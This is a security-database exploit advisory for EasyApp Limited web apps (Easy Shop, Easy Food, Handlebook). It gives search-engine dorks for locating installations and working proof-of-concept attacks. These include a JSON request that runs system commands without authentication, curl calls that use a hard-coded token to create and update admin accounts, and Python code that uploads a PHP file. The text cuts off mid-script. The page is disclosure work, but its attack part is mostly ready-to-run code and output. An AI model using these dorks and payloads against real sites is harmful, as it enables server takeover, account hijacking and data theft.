---
title: EasyApp Limited - Multiple Vulnerabilities
url: https://cxsecurity.com/issue/WLB-2025080020
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-24
fetch_date: 2025-10-07T00:16:47.995413
---

# EasyApp Limited - Multiple Vulnerabilities

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **EasyApp Limited - Multiple Vulnerabilities** **2025.08.23**  Credit:  **[bRpsd](https://cxsecurity.com/author/bRpsd/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A**  **[**Dork:** Powered By EasyApp Limited inurl:app/web](https://cxsecurity.com/dorks/)** | |

# Exploit Title: EasyApp Limited - Multiple Vulnerabilities
# Date: 2025-06-27
# Exploit Author: bRpsd -> cy[at]live.no
# Vendor Homepage: https://easyapp.com.hk/
# Products: Easy Shop, Easy Food, Handlebook
# Affected Versions: v2.5 and below
# CVE: N/A
# Tested on: localhost xampp, MacOS
# Dorks:
"Powered By Easyapp © 2025"
Powered By EasyApp Limited inurl:app/web
"Powered By EasyApp Limited"
"DESIGN BY HANDLEBOOK EDUCATION SOLUTIONS © 2025"
"EasyApp Login"
inurl:/web/product\_detail.php?linkid=
inurl:app/admin2/login.php
inurl:app/#!/template/newsList.php
##########################################################################################
Vulnerability: PHP Object Injection "CWE-502: Deserialization of Untrusted Data"
The function directly processes unsanitized JSON input from php://input leading to Unauthenticated RCE
File: /app/php/data.php
Code:
=================================================================================
$path = $\_SERVER['DOCUMENT\_ROOT'];
include\_once($path);
$json = json\_decode(file\_get\_contents("php://input"),true) ;
// Calling Custom Function
echo json\_encode($json["action"]($json["data"]));
=================================================================================
POC:
==========================================================================================
POST https://localhost/app/php/data.php HTTP/1.1
host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: application/json, text/javascript, \*/\*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
content-length: 35
Connection: keep-alive
Cookie: \_ga\_RRH2QH5VDJ=GS2.1.s1755785674$o1$g1$t1755785674$j60$l0$h0; \_ga=GA1.1.1404825214.1755785674
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
{"action":"system","data":"whoami"}
Response:
HTTP/1.1 200 OK
Date: Thu, 15 Aug 2025 14:19:26 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
root
"root"
Using CURL:
curl -X POST https://localhost/app/php/data.php \
-H "Content-Type: application/json" \
-d '{"action":"system","data":"uname"}'
"Darwin"
##########################################################################################
Vulnerability 2: Static Token Bypass (CWE-798: Use of Hard-coded Credentials)
File: /app/admin2/php/data.php
Code:
=================================================================================
function getAppAccessRight($functionName,$param)
{
$data = array();
$data["status"] = "SUCCESS" ;
$uid = $\_COOKIE["uid"] ;
$token = $\_COOKIE["token"] ;
$escapeFunction = ESCAPE\_FUNC\_TOKEN ;
// echo $functionName . "<br/>";
// echo $escapeFunction . "<br/>";
if (strpos($escapeFunction, $functionName) !==false)
return $data ;
if ($token == "abcdefghijklmnopqrstuvwxyz1234567890")
return $data ;
=================================================================================
This means calling arbitrary admin functions via /app/admin2/php/data.php can be easily bypassed,We can use this hard-coded token to (create admin, update an admin) and trigger MANY other admin-based functions directly:
POC:
==========================================================================================
curl -X POST \
'https://localhost/app/admin2/php/data.php' \
-H 'Cookie: token=abcdefghijklmnopqrstuvwxyz1234567890; blogin=true; uid=1; logined=true; token=true' \
-H 'Content-Type: application/json' \
-d '{
"action": "updateAdmin",
"data": {
"fullname": "X",
"loginid": "XXXXXXXXXX",
"pwd": "XXXXXXXXXX",
"email": "X@X.com",
"role": "ADMIN",
"userid": "1",
"imgattachid": "1"
}
}'
Response:
{"uid":"UID\_HERE","status":"SUCCESS"}
curl -X POST \
'https://localhost/app/admin2/php/data.php' \
-H 'Cookie: token=abcdefghijklmnopqrstuvwxyz1234567890; blogin=true; uid=1; logined=true; token=true' \
-H 'Content-Type: application/json' \
-d '{
"action": "createAdmin",
"data": {
"fullname": "X",
"loginid": "X",
"pwd": "X",
"email": "X@X.com",
"role": "ADMIN",
"userid": "1",
"imgattachid": "1"
}
}'
Response:
{"uid":"UID\_HERE","status":"SUCCESS"}
==========================================================================================
##########################################################################################
Vulnerability: Unauthenticated Arbitrary File UPLOAD,DELETE & Exposure
path: app/admin2/userimg
Direct access expose list of files uploaded to the directory /app/admin2/userimg/:
Example:
{"files":[{"name":"x.jpg","size":4,"url":"https:\/\/localhost\/app\/admin2\/userimg\/files\/x.jpg","deleteUrl":"https:\/\/localhost.hk\/app\/admin2\/userimg\/index2.php?file=x.jpg","deleteType":"DELETE"}]}
We can run direct commands to upload/delete
Python Code for uploading a test.php:
==========================================================================================
import requests
# Define the URL and headers
url = "https://localhost/app/admin2/userimg/"
headers = {
"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0",
"Accept": "application/json, text/javascript, \*/\*; q=0.01",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate, br, zstd",
"X-Requested-With": "XMLHttpRequest",
"Origin": "https://localhost/",
"Connection": "keep-alive",
"Referer": "https://localhost/app/admin2/news-list-add.php",
"Sec-Fetch-Dest": "empty",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Site": "same-origin"
}
# Payload to accept file (some settings allow direct PHP upload, others don't)
payload = {
'attachid': '1',
'gtitle\_zh': '1',
'linkid': '1'
}
files = {
'files[]': ('x.PhP', 'test', 'multipart/form-data')
}
response = requests.post(url, headers=headers, data=payload, files=files)
# Print the response
pr...